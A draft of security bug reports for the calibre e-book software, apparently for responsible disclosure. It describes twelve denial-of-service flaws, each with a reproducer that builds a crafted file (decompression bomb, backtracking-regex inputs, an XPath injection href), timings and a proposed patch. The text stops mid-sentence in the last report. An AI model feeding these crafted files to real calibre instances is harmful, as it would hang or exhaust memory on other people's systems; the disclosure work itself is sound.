# Bugs to report to upstream calibre

Status: **not yet reported.** Found **2026-11-17** to **2026-11-19** while porting
calibre's metadata readers (PRs #179, #185, #188 and #195) and hardening LiuXin's
own readers and converters (PRs #180, #186 and #193).

These are twelve ways a damaged or hostile file keeps a calibre metadata reader
or conversion busy for minutes or for ever, or fills memory. Each section has the
location, a reproducer to run with `calibre-debug`, what was measured, and a
suggested fix.

## Before filing

- **Source checked:** calibre's master branch with version string `9.18.100`, just
  after the 9.18 release. Check current master first; any of these may have been
  fixed since.
- **How it was reproduced:** with calibre's own code, run outside calibre (the
  imports changed, nothing else) on Python 3.13, on a 2-core cloud machine with
  7 GB of memory. Not yet confirmed against an installed calibre. Each
  reproducer below runs with `calibre-debug -e <script>.py`.
- **Where to report:** calibre takes ordinary bugs on
  [Launchpad](https://bugs.launchpad.net/calibre). Recent security fixes have gone
  through [GitHub security advisories](https://github.com/kovidgoyal/calibre/security/advisories).
  All twelve are denial of service from a crafted file; bug 9 also runs the
  book's text as XPath, though only within the book. That makes them candidates for a
  private advisory rather than a public bug, or for a public bug if calibre
  treats reader hangs as ordinary bugs. Choosing which is the reporter's call.
  Bugs 5 and 7 to 10 also reach calibre's conversion, not only its metadata
  readers; bug 11 is in conversion alone, and bug 12 reaches PDB conversion
  too.
- **Order:** bugs 2 and 3 should go together. Fixing 2 lets never-closed info
  blocks reach the patterns in 3, which are then cubic rather than quadratic.
  Bugs 6 to 10 are all in the MOBI reader and could go as one report. Bug 12
  is bug 8's shape in the PDB header reader, and its fix could follow 8's.

## Summary

| # | Where | Trigger | Effect |
|---|---|---|---|
| 1 | `ebooks/metadata/topaz.py`, `MetadataUpdater.get_headers` | A header or block count past the end of the file | 9-byte file: 7.8 minutes, 2.2 GB, then an error |
| 2 | `ebooks/metadata/rtf.py`, `get_document_info` | An `{\info` group that the end of the file cuts off | Never returns; memory grows about 100 MB a second |
| 3 | `ebooks/metadata/rtf.py`, the five field patterns | Many `{\info` groups and a field that isn't there | Quadratic: 56 kB takes 10 s. Cubic once 2 is fixed |
| 4 | `ebooks/metadata/html.py`, `handle_comment` | An HTML comment with a long run of characters and no spaces | Quadratic: 40,000 characters take 14–32 s; the 150,000 calibre reads, minutes |
| 5 | `ebooks/chardet.py`, the XML-declaration and HTML 4 charset patterns | Unclosed `<?…encoding="`, or `<meta` and spaces | Cubic and quadratic: 8 KB takes 8.5 s; 50 KB over half an hour; the whole file is searched |
| 6 | `ebooks/mobi/reader/headers.py`, `EXTHHeader` | An EXTH record of size 0 | Read again for every record claimed, up to 2**32: hours, keeping each |
| 7 | `ebooks/mobi/huffcdic.py`, `HuffReader` | Dictionary entries naming other entries | 67 KB unpacks to 1 GB; one more level, 35 TB |
| 8 | `ebooks/mobi/reader/mobi6.py`, `MobiReader.__init__` | A section table whose offsets go back and forth | A 1 MB file holds 400 MB with 801 sections, 30 GB with 65,535 |
| 9 | `ebooks/mobi/reader/mobi6.py`, `read_embedded_metadata` and `create_opf` | A quote in the guide's cover or toc href | The read fails, or runs XPath of the book's choosing: 15 s on 50 KB |
| 10 | `ebooks/mobi/reader/mobi6.py`, clean-up and anchor placement | Eight shapes of markup | Quadratic or worse: from 8.6 s on 3.4 KB to hours on 4 MB |
| 11 | `ebooks/conversion/preprocess.py` and `utils.py`, the entity and `<pre>` patterns | A run of `&` with no `;` in any HTML file converted; any long text after the last `</pre>`, with heuristics on | Quadratic: 80 KB takes 33 s; 1 MB about an hour and a half |
| 12 | `ebooks/pdb/header.py`, `PdbHeaderReader.section_data` | A section table whose offsets go back | Each section reads to the end of the file, and the Haodoo reader keeps them all: 1.9 GB for 4,000 sections in 536 KB; a table names up to 65,535 |

## 1. Topaz: counts past the end of the file

`get_headers` loops once for each header the file claims (`header_records`), and
once for each block each header claims (`num_vals`). Both counts are variable-width
integers read from up to 4 bytes, so they reach 2**28 − 1. `StreamSlicer` returns
`b''` for any slice past the end without reading, so nothing stops the loop.
Every pass also appends to `th_seq`.

```python
# topaz_counts.py: run with calibre-debug -e topaz_counts.py
import io
import time

from calibre.ebooks.metadata.topaz import get_metadata

start = time.monotonic()
try:
    get_metadata(io.BytesIO(b'TPZ0\xff\xff\xff\x7fc'))
except Exception as err:
    print('raised', type(err).__name__, err)
print(f'{time.monotonic() - start:.0f} s')
```

**Measured:** 469 s (7.8 minutes) at a peak of 2.2 GB, then `ValueError: Invalid
Topaz format - no metadata record`. A count in the block loop (`num_vals`) does the
same.

**Suggested fix:** stop when a record or block would start past the end.

```diff
         for x in range(self.header_records):
+            if offset >= len(self.data):
+                raise ValueError('Truncated Topaz header')
             offset += 1
@@
             for val in range(num_vals):
+                if offset >= len(self.data):
+                    raise ValueError('Truncated Topaz header')
                 hdr_offset, consumed = self.decode_vwi(self.data[offset : offset + 4])
```

## 2. RTF: an info group cut off by the end of the file

`get_document_info` finds `{\info` and then reads one byte at a time until the
braces balance. At the end of the file `stream.read(1)` returns `b''`, which is
neither a backslash nor a brace, so it is appended to `data` and the loop goes on
for ever. `set_metadata` calls `get_document_info` too, so writing metadata to such
a file hangs in the same way.

```python
# rtf_cut_off.py: run with calibre-debug -e rtf_cut_off.py
# Never finishes. Stop it before it runs out of memory.
import io

from calibre.ebooks.metadata.rtf import get_metadata

get_metadata(io.BytesIO(rb'{\rtf1\ansi{\info{\title Cut off'))
```

**Measured:** no return; resident memory rose from 0.6 GB to 1.6 GB in 10 seconds.

**Suggested fix:**

```diff
     while True:
         ch = stream.read(1)
+        if not ch:
+            break
         if ch == b'\\':
```

The block returned is then the cut-off group. With bug 3 still present, the field
patterns can take cubic time on it; see the note at the end of bug 3.

## 3. RTF: field patterns that backtrack

The reader finds each field with a pattern of this form:

```python
title_pat = re.compile(rb'\{\\info.*?\{\\title(.*?)(?<!\\)\}', re.DOTALL)
```

`search` tries every `{\info` in the block as a start. When the field isn't there,
each start's `.*?` scans to the end of the block, so a block of many `{\info` groups
takes quadratic time. That happens once for each of the five patterns. The
reproducer below is well formed RTF as far as the brace count goes, so
`get_document_info` returns normally even with bug 2 present.

```python
# rtf_patterns.py: run with calibre-debug -e rtf_patterns.py
import io
import time

from calibre.ebooks.metadata.rtf import get_metadata

for groups in (1000, 2000, 4000, 8000):
    data = b'{\\rtf1{\\info' + b'{\\info}' * groups + b'}}'
    start = time.monotonic()
    get_metadata(io.BytesIO(data))
    print(len(data), 'bytes', f'{time.monotonic() - start:.2f} s')
```

**Measured:**

| Size | Time |
|---|---|
| 7 kB | 0.16 s |
| 14 kB | 0.57 s |
| 28 kB | 2.5 s |
| 56 kB | 10 s |

Doubling the size multiplies the time by about four, so 0.5 MB would take about
14 minutes (extrapolated, not run).

**After bug 2 is fixed** the block can end without a closing brace. Then the
`(.*?)(?<!\\)\}` part also scans to the end for every `{\title`, and reading becomes
cubic. In LiuXin's reader, which already stopped at the end of the file, 7.5 kB of
repeated `{\info{\title x` took 6.4 s and 15 kB took 53 s. The writer's pattern in
`set_metadata`, `\{\\name(.*?)(?<!\\)\}` used with `subn`, becomes quadratic on the
same input: 150 kB took 15 s.

**Suggested fix:** find fields with `find` instead. This returns what the
pattern's `search` returns: the first field after the first `{\info`, up to the
first brace that no backslash precedes. If that field has no closing brace, no
later one does either, so `None` is the right answer.

```python
def closing_brace(text, start):
    brace, backslash = ('}', '\\') if isinstance(text, str) else (b'}', b'\\')
    end = text.find(brace, start)
    while end > 0 and text[end - 1:end] == backslash:
        end = text.find(brace, end + 1)
    return end


def info_field(block, name):
    info = block.find(b'{\\info')
    if info < 0:
        return None
    opening = b'{\\' + name
    field = block.find(opening, info + len(b'{\\info'))
    if field < 0:
        return None
    start = field + len(opening)
    end = closing_brace(block, start)
    return None if end < 0 else block[start:end]
```

The writer can loop over `{\name` fields the same way, replacing each up to its
closing brace. LiuXin's version of both, `info_field` and `replace_fields` in
`src/LiuXin_alpha/metadata/file_sources/rtf.py`, gave the same results as the
patterns on 100,000 random blocks. A 1.5 MB file now reads or rewrites in about
0.2 s.

## 4. HTML: the comment pattern backtracks

`handle_comment` reads metadata comments such as `<!-- TITLE="A Book" -->` with

```python
_handle_comment_pat = re.compile(rf'''(?P<name>\S+)\s*=\s*{attr_pat}''')
for match in _handle_comment_pat.finditer(data):
```

`finditer` tries the pattern at every character. On a run of characters without a
space, `\S+` takes the rest of the run and then backs off a character at a time
looking for `=` and a quote, so each start costs the length of the run and the whole
comment costs its square. `a=a=a=…` is worse, as every `=` is tried. `get_metadata_`
keeps only the first 150,000 characters, which bounds it at minutes.

```python
# html_comment.py: run with calibre-debug -e html_comment.py
import io
import time

from calibre.ebooks.metadata.html import get_metadata

for size in (10_000, 20_000, 40_000):
    for label, comment in (('run', 'a' * size), ('equals', 'a=' * (size // 2))):
        data = f'<html><head><!-- {comment} --></head></html>'.encode()
        start = time.monotonic()
        get_metadata(io.BytesIO(data))
        print(label, size, f'{time.monotonic() - start:.2f} s')
```

**Measured** (calibre's code with html5-parser replaced by lxml's HTML parser, which
parses these pages in milliseconds; the time is the pattern's):

| Characters | Run of `a` | `a=a=…` |
|---|---|---|
| 10,000 | 0.87 s | 2.1 s |
| 20,000 | 3.5 s | 7.6 s |
| 40,000 | 14 s | 32 s |

At the 150,000-character cap that is about 3 and 7 minutes (extrapolated, not run).

**Suggested fix:** a match starting inside a run would also match from the run's
start, so trying only the search position and the starts of runs finds the same
matches as `finditer`:

```python
_token_start_pat = re.compile(r'\s\S')


def comment_matches(pat, data):
    ans, pos = [], 0
    while pos < len(data):
        match = pat.match(data, pos)
        if match is not None:
            ans.append(match)
            pos = match.end()
            continue
        nxt = _token_start_pat.search(data, pos)
        if nxt is None:
            break
        pos = nxt.start() + 1
    return ans
```

This gave the same matches as `finditer` on 200,000 random comments, and reads
150,000 characters in 6 ms.

## 5. chardet: the encoding-declaration patterns backtrack

`ebooks/chardet.py` finds encoding declarations with three patterns. Two of them
backtrack:

```python
r'<\?[^<>]+encoding\s*=\s*[\'"](.*?)[\'"][^<>]*>'
r'''<meta\s+?[^<>]*?content\s*=\s*['"][^'"]*?charset=([-_a-z0-9]+)[^'"]*?['"][^<>]*>(?:\s*</meta>){0,1}'''
```

In the first, `[^<>]+` backs off over every `encoding=` in the tag. For each,
`(.*?)` stops at every later quote on the line, and `[^<>]*>` scans from there to
the next `<` or `>`, so the cost grows with the cube. In the second, `\s+?` and
`[^<>]*?` split a run of spaces every way. `detect_xml_encoding`, which
`xml_to_unicode` calls, searches the whole file with both, so every reader and
input plugin that decodes with `xml_to_unicode` is exposed: OPF, EPUB, HTML, FB2
and MOBI among them. `strip_encoding_declarations` runs them on the first 50 KB.

```python
# chardet_declarations.py: run with calibre-debug -e chardet_declarations.py
import time

from calibre.ebooks.chardet import xml_to_unicode

for size in (2_000, 4_000, 8_000):
    for label, raw in (
        ('<?…encoding="', b'<?' + b'encoding="' * (size // 10)),
        ('<meta + spaces', b'<meta' + b' ' * (size * 2)),
    ):
        start = time.monotonic()
        xml_to_unicode(raw)
        print(label, len(raw), f'{time.monotonic() - start:.2f} s', flush=True)
```

**Measured:**

| Bytes | `<?` and `encoding="` repeated | Bytes | `<meta` and spaces |
|---|---|---|---|
| 2,002 | 0.18 s | 4,005 | 0.13 s |
| 4,002 | 1.03 s | 8,005 | 0.48 s |
| 8,002 | 8.5 s | 16,005 | 2.0 s |

At 50 KB the first is over half an hour (extrapolated, not run); a whole file of
a few megabytes would take years.

**Suggested fix:** either of these.

- Search only the start of the file. The XML declaration must come first, and
  HTML's own prescan for a charset reads 1,024 bytes; at 1 KB even the cubic
  case takes milliseconds. Declarations further in would no longer be found.
- Keep the exact matches, as LiuXin did: `xml_declarations` and
  `html4_charsets` in `utils/linear_time.py` (GPL-3, PRs #188 and #190) find
  them by hand, scanning each stretch of the text once, and return the same
  match objects. A simpler rewrite such as `([^'"]*)`
  for `(.*?)` would still be quadratic, as each `encoding=` would still scan
  to the end of the tag.

## MOBI test books

Bugs 6 to 10 use small MOBI books built by this helper. Save it as `mobi_book.py`
next to their reproducers.

```python
# mobi_book.py: builds the small MOBI books the reproducers below use.
# Keep it next to them; calibre-debug -e runs each with its folder on sys.path.
import struct


def exth(records, count=None):
    body = b''.join(struct.pack('>LL', kind, 8 + len(data)) + data for kind, data in records)
    raw = b'EXTH' + struct.pack('>LL', 12 + len(body), len(records) if count is None else count) + body
    return raw + b'\0' * (-len(raw) % 4)


def record0(text_records, *, compression=1, exth_raw=None, huff=(0, 0)):
    head = bytearray(16 + 0xE8)
    struct.pack_into('>HHLHHH', head, 0, compression, 0, 0, text_records, 4096, 0)
    head[16:20] = b'MOBI'
    struct.pack_into('>LLLLL', head, 20, 0xE8, 2, 65001, 1, 6)
    struct.pack_into('>L', head, 0x5C, 9)
    struct.pack_into('>LLLL', head, 0x68, 6, 0xFFFFFFFF, *huff)
    struct.pack_into('>L', head, 0x80, 0x40 if exth_raw is not None else 0)
    struct.pack_into('>LLL', head, 0xC0, 0xFFFFFFFF, 0, 0)
    struct.pack_into('>L', head, 0xF4, 0xFFFFFFFF)
    extra = exth_raw or b''
    struct.pack_into('>LL', head, 0x54, len(head) + len(extra), 1)
    raw = bytes(head) + extra + b'T\0'
    return raw + b'\0' * (-len(raw) % 4)


def palmdb(records, offsets=None):
    if offsets is None:
        offsets, pos = [], 78 + 8 * len(records) + 2
        for record in records:
            offsets.append(pos)
            pos += len(record)
    head = b'T'.ljust(32, b'\0') + bytes(28) + b'BOOKMOBI' + struct.pack('>LLH', 0, 0, len(records))
    table = b''.join(struct.pack('>LL', offset, 2 * i) for i, offset in enumerate(offsets))
    return head + table + b'\0\0' + b''.join(records)


def book(html, exth_raw=None):
    texts = [html[i:i + 4096] for i in range(0, len(html), 4096)] or [b'']
    return palmdb([record0(len(texts), exth_raw=exth_raw), *texts])
```

`get_metadata` reads a book with an EXTH header from its headers. A book under
4 MB without one has its whole text decompressed and run through `MobiReader`,
the first half of MOBI conversion, to find metadata in the markup. Bugs 7 to 10
are on that path, so they also reach MOBI conversion, at any size.

## 6. MOBI: an EXTH record of size 0

`EXTHHeader.__init__` (`ebooks/mobi/reader/headers.py`) steps through the records
by each one's size, as many times as the header claims (`num_items`, up to 2**32 −
1). A record of size 0 is read again on every pass, and an author or tag record
is kept each time.

```python
# mobi_exth_size_zero.py: run with calibre-debug -e mobi_exth_size_zero.py
import io
import struct
import time

from calibre.ebooks.metadata.mobi import get_metadata
from mobi_book import book

for count in (250_000, 500_000, 1_000_000):
    # One author record of size 0, in a header claiming `count` records.
    header = b'EXTH' + struct.pack('>LL', 20, count) + struct.pack('>LL', 100, 0)
    start = time.monotonic()
    mi = get_metadata(io.BytesIO(book(b'<html><body>x</body></html>', header)))
    print(count, 'records:', len(mi.authors), 'authors,', f'{time.monotonic() - start:.2f} s', flush=True)
```

**Measured:** 250,000 records: 0.38 s; 500,000: 1.05 s; 1,000,000: 1.58 s, each
with as many authors. At 2**32 − 1 that is about two hours, holding four billion
author names (extrapolated, not run).

**Suggested fix:** stop at a record of size 0.

```diff
             idx, size = struct.unpack('>LL', raw[pos : pos + 8])
+            if size == 0:
+                break
             content = raw[pos + 8 : pos + size]
```

## 7. MOBI: HUFF/CDIC text unpacks without limit

`HuffReader` (`ebooks/mobi/huffcdic.py`) unpacks a dictionary entry that is not a
literal by unpacking its codes, which name other entries. An entry can name
another entry thousands of times, and that one another, so a few bytes stand for
gigabytes. Nothing limits the output.

```python
# mobi_huff_bomb.py: run with calibre-debug -e mobi_huff_bomb.py
# Watch the memory: the last book unpacks to 1 GB.
import io
import struct
import time

from calibre.ebooks.mobi.reader.mobi6 import MobiReader
from calibre.utils.logging import default_log
from mobi_book import palmdb, record0


def huff_book(width, depth):
    # Every byte is one 8-bit code; code b means dictionary entry 255 - b.
    dict1 = struct.pack('>256L', *[(255 << 8) | 0x80 | 8] * 256)
    huff = b'HUFF\0\0\0\x18' + struct.pack('>LL', 24, 24 + len(dict1)) + bytes(8) + dict1 + bytes(256)
    # Entry 0 is the letter A; entry k is `width` copies of entry k - 1.
    entries = [(b'A', True)] + [(bytes([256 - k]) * width, False) for k in range(1, depth + 1)]
    table, blobs = b'', b''
    for blob, literal in entries:
        table += struct.pack('>H', 2 * len(entries) + len(blobs))
        blobs += struct.pack('>H', len(blob) | (0x8000 if literal else 0)) + blob
    cdic = b'CDIC\0\0\0\x10' + struct.pack('>LL', len(entries), 8) + table + blobs
    text = bytes([255 - depth])  # one code: the deepest entry
    return palmdb([record0(1, compression=17480, huff=(2, 2)), text, huff, cdic])


for width in (1_000, 10_000, 32_767):
    data = huff_book(width, 2)
    start = time.monotonic()
    reader = MobiReader(io.BytesIO(data), default_log)
    reader.extract_text()
    print(len(data), 'bytes unpack to', len(reader.mobi_html), f'in {time.monotonic() - start:.2f} s', flush=True)
```

**Measured:** 3,698 bytes unpack to 1 MB; 21,698 bytes to 100 MB; 67,232 bytes
to 1.07 GB, in 0.66 s. A third level of entries would ask for 35 TB.
`get_metadata` goes on to parse whatever comes out.

**Suggested fix:** count the bytes `unpack` produces, entries included, and raise
`MobiError` past a limit. LiuXin uses 32 MiB for metadata reading, where the file
is under 4 MB; conversion would want a limit scaled to the book.

## 8. MOBI: overlapping section tables

`MobiReader.__init__` (`ebooks/mobi/reader/mobi6.py`) slices each section from its
offset to the next section's offset, copying it. A section table whose offsets go
back and forth names the same bytes again and again, and each copy is kept.

```python
# mobi_overlapping_sections.py: run with calibre-debug -e mobi_overlapping_sections.py
import io
import resource

from calibre.ebooks.mobi.reader.mobi6 import MobiReader
from calibre.utils.logging import default_log
from mobi_book import palmdb, record0

blob = b'<html><body><p>x</p></body></html>' + b' ' * 1_000_000
for pairs in (100, 200, 400):
    # Sections run to the next section's offset: alternating offsets
    # make every other section the whole 1 MB blob again.
    records = [record0(1), blob] + [b''] * (2 * pairs)
    first = 78 + 8 * len(records) + 2
    start, end = first + len(records[0]), first + len(records[0]) + len(blob)
    data = palmdb(records, [first, start] + [end, start] * pairs)
    reader = MobiReader(io.BytesIO(data), default_log)
    held = sum(len(section) for section, _ in reader.sections)
    rss = resource.getrusage(resource.RUSAGE_SELF).ru_maxrss // 1024
    print(f'{len(data):,} byte file: sections hold {held:,} bytes; peak memory {rss} MB', flush=True)
    del reader
```

**Measured:** a 1.0 MB file with 201, 401 and 801 sections held 101 MB, 201 MB
and 401 MB, at peaks of 128, 224 and 415 MB. The table allows 65,535 entries:
about 30 GB from this file, or 100 GB from one of 3.4 MB (extrapolated, not run).

**Suggested fix:** sections of a well-formed book do not overlap, so together they
hold no more than the file. LiuXin refuses a book whose sections hold more than
twice the file:

```diff
+        held = 0
         for i in range(self.num_sections):
             self.sections.append((section(i), self.section_headers[i]))
+            held += len(self.sections[-1][0])
+            if held > 2 * len(raw_bytes):
+                raise MobiError('MOBI sections overlap')
```

## 9. MOBI: guide hrefs pasted into XPath

`MobiReader` looks up two targets from the book's `<guide>` by pasting them into an
XPath expression: the cover reference's `href` in `read_embedded_metadata`, and the
toc reference's fragment in `create_opf`.

```python
anchors = root.xpath(f'//*[@id="{href}"]')
elems = root.xpath('//*[@id="{}"]'.format(toc.partition('#')[-1]))
```

A quote in the href ends the string, and the rest runs as XPath of the book's
choosing. A lone quote fails the whole read with `XPathEvalError`; an expression
that compares every element with every later one runs for as long as the book
likes. XPath 1.0 in lxml has no way out of the document here, so the harm is
denial of service.

```python
# mobi_guide_xpath.py: run with calibre-debug -e mobi_guide_xpath.py
import io
import time

from calibre.ebooks.metadata.mobi import get_metadata
from mobi_book import book

# The toc reference's fragment is pasted into //*[@id="..."]: a quote ends the
# string and the rest is XPath, here one that compares every element with
# every later one.
slow = 't"] | descendant::*[count(descendant::*/following::*) > 1] | *[@id="'
for links in (500, 1_000, 2_000):
    html = (
        f"<html><head><guide><reference type='toc' title='t' href='#{slow}'/></guide></head>"
        "<body><p id='t'>toc</p>" + "<p><a href='#x'>x</a></p>" * links + '</body></html>'
    ).encode()
    start = time.monotonic()
    get_metadata(io.BytesIO(book(html)))
    print(len(html), 'bytes:', f'{time.monotonic() - start:.2f} s', flush=True)

# A lone quote is enough to fail the read.
html = b"<html><head><guide><reference type='toc' title='t' href='#a\"b'/></guide></head><body>x</body></html>"
try:
    get_metadata(io.BytesIO(book(html)))
except Exception as e:
    print('quote:', type(e).__name__, e)
```

**Measured:** 12,681 bytes: 0.33 s; 25,181: 2.2 s; 50,181: 15 s. The lone quote:
`XPathEvalError: Invalid predicate`.

**Suggested fix:** pass the value as an XPath variable.

```diff
-                    anchors = root.xpath(f'//*[@id="{href}"]')
+                    anchors = root.xpath('//*[@id=$id]', id=href)
@@
-            elems = root.xpath('//*[@id="{}"]'.format(toc.partition('#')[-1]))
+            elems = root.xpath('//*[@id=$id]', id=toc.partition('#')[-1])
```

## 10. MOBI 6: clean-up patterns and repeated scans

`MobiReader` cleans the text with patterns that backtrack, and places anchors and
images with scans that start again for each one. Each case below takes time that
grows with the square of the input or worse. The cases, in
`ebooks/mobi/reader/mobi6.py`:

| Case | Where | Why |
|---|---|---|
| A page break whose attributes end in `/` without `>`, after spaces | `PAGE_BREAK_PAT`, `replace_page_breaks` | `\s*/{0,1}\s*` and `(?:\s+[^/>]*)` split a run of spaces every way: cubic |
| `<` followed by spaces | the `o:p` pattern in `cleanup_html`, and `PAGE_BREAK_PAT` | `<\s*(/?)\s*o:p` splits the spaces between two `\s*` |
| `filepos=` in a tag that never closes | `link_pattern` in `add_anchors` | every `filepos=` and every shorter digit run is retried against the rest of the tag |
| `&` with no `;` after it | the entity-anchor pattern at the end of `add_anchors` | each `&` scans to the end of the text |
| A run of `<b>`, `<i>` and the like not followed by `<p>` | the first swap in `cleanup_html` | each tag of the run is tried, and scans the rest of the run |
| `</p`, `<p`, `<?xml`, `<o:p` or `name: ` tags that never close; `</div>` runs before an open `</p`; `<metadata>` or `<guide>` without its end tag, on one line | the other swaps, `cleanup_html`, `extract_content` | each try scans to a `>` (or a newline) that never comes |
| Many differently styled tags | `upshift_markup` | each new rule is compared with every rule so far |
| Many `<svg>` images, or page-break anchors, among many siblings | `upshift_markup` | each is placed with `parent.index()` and `insert()`, counting the siblings |
| Many links to targets in a long stretch without tags | `add_anchors` | each target searches afresh to the next `<` and `>`, and back to the last `<` |

```python
# mobi6_backtracking.py: run with calibre-debug -e mobi6_backtracking.py
# Books without EXTH, under 4 MB, so get_metadata runs the MOBI 6 reader.
# Each case doubles its input: times that grow fourfold or more are quadratic
# or worse. Takes a few minutes.
import io
import time

from calibre.ebooks.metadata.mobi import get_metadata
from mobi_book import book

CASES = [
    ('page break, spaces, "/" not closed', lambda n: b'<p><mbp:pagebreak' + b' ' * n + b'x/', (750, 1_500, 3_000)),
    ('"<" and spaces', lambda n: b'<html><body><p><' + b' ' * n + b'x', (10_000, 20_000, 40_000)),
    ('filepos= in a tag never closed', lambda n: b'<' + (b' filepos=' + b'1' * 200) * n + b'<', (50, 100, 200)),
    ('"&" with no ";"', lambda n: b'&x<a filepos=1>' * n, (1_000, 2_000, 4_000)),
    ('run of <b> with no <p>', lambda n: b'<html><body>' + b'<b>' * n, (4_000, 8_000, 16_000)),
    ('differently styled tags', lambda n: b'<html><body>' + b''.join(b"<p style='a:%d'>x</p>" % i for i in range(n)), (2_500, 5_000, 10_000)),
    ('svg images among many siblings', lambda n: b'<html><body><div>' + b"<svg><img src='a'></svg>" * n, (10_000, 20_000, 40_000)),
    ('page-break anchors among many siblings', lambda n: b'<html><body><div>' + b''.join(b"<div class='mbp_pagebreak' filepos-id='f%d'></div>" % i for i in range(n)), (5_000, 10_000, 20_000)),
]

for label, make, sizes in CASES:
    for size in sizes:
        data = book(make(size))
        start = time.monotonic()
        get_metadata(io.BytesIO(data))
        print(f'{label}: {len(data):,} bytes, {time.monotonic() - start:.2f} s', flush=True)
```

**Measured** (calibre's code with html5-parser replaced by lxml's HTML parser,
which `MobiReader` only reaches for markup lxml rejects):

| Case | Smallest | Middle | Largest | At 4 MB (extrapolated) |
|---|---|---|---|---|
| Page break, spaces, `/` | 1.1 KB: 0.16 s | 1.9 KB: 1.2 s | 3.4 KB: 8.6 s | far beyond |
| `<` and spaces | 10 KB: 0.38 s | 20 KB: 1.7 s | 40 KB: 7.0 s | about 19 hours |
| `filepos=` in an open tag | 11 KB: 0.52 s | 21 KB: 2.2 s | 42 KB: 8.5 s | about a day |
| `&` with no `;` | 15 KB: 0.13 s | 30 KB: 0.41 s | 60 KB: 1.7 s | about 2 hours |
| Run of `<b>` | 12 KB: 1.5 s | 24 KB: 5.3 s | 48 KB: 21 s | over a day |
| Differently styled tags | 57 KB: 0.09 s | 114 KB: 0.36 s | 230 KB: 1.6 s | about 8 minutes |
| svg images | 241 KB: 0.50 s | 481 KB: 3.6 s | 962 KB: 20 s | about 6 minutes |
| Page-break anchors | 260 KB: 0.33 s | 520 KB: 4.0 s | 1.05 MB: 22 s | about 5 minutes |

The anchor searches are fast scans: 3.8 MB of links into a stretch without tags
took 4.3 s. But PalmDOC lets a 4 MB file hold up to five times as much text, and
the time grows with the square.

**Suggested fix:** each has a small change that keeps calibre's results. LiuXin's
are in `PATCHES` in `scripts/port_upstream_calibre.py`, PR #188, with the helpers
in `utils/linear_time.py`:

- Read whitespace possessively where it can only end one way:
  `<\s*+/{0,1}\s*+mbp:pagebreak((?>(?:\s+[^/>]*){0,1}))…` and `<\s*+(/?)\s*+o:p[^>]*>`
  (Python 3.11 and later).
- Check that a tag closes before looking inside it:
  `<(?=[^<>]*>)[^<>]+filepos=['"]{0,1}(\d+)[^<>]*>`.
- For patterns that scan to a `>`, `;` or newline: after a try fails, skip to
  past the character it scanned to, since every try before it fails the same
  way; stop at the last such character.
- For the swaps that begin with a run of tags: a match starting inside a run
  would match from its start, so try only the starts of runs.
- Keep a dictionary from CSS rule to class; place images with `addprevious` and
  anchors with `addnext`, beside the element itself; and in `add_anchors`, as the
  targets come in order, reuse the last search's answer while it still holds.

Run against random input, each change gave exactly the original's results, and
the patched reader read 9,000 random books exactly as calibre's does.

## 11. Conversion: the entity and `<pre>` patterns backtrack

`HTMLPreProcessor`, which conversion runs on every HTML document it reads,
resolves entities with

```python
@lru_cache(2)
def entity_regex() -> re.Pattern[str]:
    return re.compile(r'&(\S+?);')
```

`sub` tries it at every `&`. In a run of `&` with no `;`, each try scans to the
end of the run and fails, so the run costs its square. `parse_html` passes every
document of the book to the preprocessor, and the polish container does the same
outside tweak mode, so one crafted file in an EPUB is enough. The same pattern is
in `HeuristicProcessor.markup_pre` (`ebooks/conversion/utils.py`), and
`entity_regex()` is in the LRF converter's `MARKUP_MASSAGE`
(`ebooks/lrf/html/convert_from.py`).

`markup_pre`, which heuristic processing runs on documents with few paragraph
tags, also takes their `<pre>` blocks with

```python
outerhtml = re.compile(r'.*?(?<=<pre>)(?P<text>.*?)</pre>', re.IGNORECASE | re.DOTALL)
html = outerhtml.sub(self.txt_process, html)
```

After the last `</pre>`, each try scans to the end of the document and fails.
This one needs no crafting: any long text after the last block will do.

```python
# conversion_patterns.py: run with calibre-debug -e conversion_patterns.py
import time

from calibre.ebooks.conversion.preprocess import HTMLPreProcessor
from calibre.ebooks.conversion.utils import HeuristicProcessor

for size in (20_000, 40_000, 80_000):
    html = '<html><body><p>' + '&' * size + '</p></body></html>'
    start = time.monotonic()
    HTMLPreProcessor()(html)
    print('entities', size, f'{time.monotonic() - start:.2f} s', flush=True)

for size in (10_000, 20_000, 40_000):
    html = '<html><body><pre>x</pre>' + 'a' * size
    start = time.monotonic()
    HeuristicProcessor().markup_pre(html)
    print('after the last </pre>', size, f'{time.monotonic() - start:.2f} s', flush=True)
```

**Measured** (calibre's `preprocess.py` and `conversion/utils.py`, with stand-ins
for the logger, the word count and the text processor that `markup_pre` calls
once, for the one block; the time is the patterns'):

| Characters | Run of `&` | Characters | Text after the last `</pre>` |
|---|---|---|---|
| 20,000 | 2.2 s | 10,000 | 0.52 s |
| 40,000 | 8.5 s | 20,000 | 2.1 s |
| 80,000 | 33 s | 40,000 | 8.6 s |

At 1 MB each would take about an hour and a half (extrapolated, not run).

**Suggested fix:**

For the entities, `&(\S[^\s;]*);|&\S[^\s;]*`, keeping only the first branch's
matches. The first branch is `&(\S+?);` read greedily: the first character may be
a `;`, and the group ends at the first `;` after it. Where it fails, every later
try in the run fails the same way, and the second branch takes the rest of the
run. The first branch alone would still be tried from every `&`, and stay
quadratic. This gave the same result as `entity_regex().sub` on 100,000 random
texts, and takes 0.02 s on a megabyte of `&`:

```python
_entity_or_run = re.compile(r'&(\S[^\s;]*);|&\S[^\s;]*')


def sub_entities(repl, html):
    return _entity_or_run.sub(lambda m: m.group() if m.group(1) is None else repl(m), html)
```

For the `<pre>` blocks, once a try fails every later one does: it lacks a `<pre>`
with a `</pre>` after it, and later tries lack it too. Taking the matches one
after another with `match`, from the end of the last, and stopping at the first
failure gives what `sub` gives:

```python
def sub_until_failure(pattern, repl, text):
    out, pos = [], 0
    while (match := pattern.match(text, pos)) is not None:
        out.append(repl(match))
        pos = match.end()
    out.append(text[pos:])
    return ''.join(out)
```

LiuXin's versions (`utils/linear_time.py`, PR #193) gave the same results as
`sub` on random text, and read a megabyte on each path in well under a second.

## 12. PDB: sections whose offsets go back

`PdbHeaderReader.section_data` reads a section from its offset to the next
section's:

```python
start = self.section_offset(number)
if number == self.num_sections - 1:
    self.stream.seek(0, 2)
    end = self.stream.tell()
else:
    end = self.section_offset(number + 1)
self.stream.seek(start)
return self.stream.read(end - start)
```

When the next offset is lower, `end - start` is negative, and `read()` of a
negative length reads to the end of the file. A table whose offsets go back
names the rest of the file once per section, and the table can name 65,535
sections. The Haodoo metadata reader (`ebooks/pdb/haodoo/reader.py`) keeps every
section, so memory grows by the file's size for each one; the Plucker and
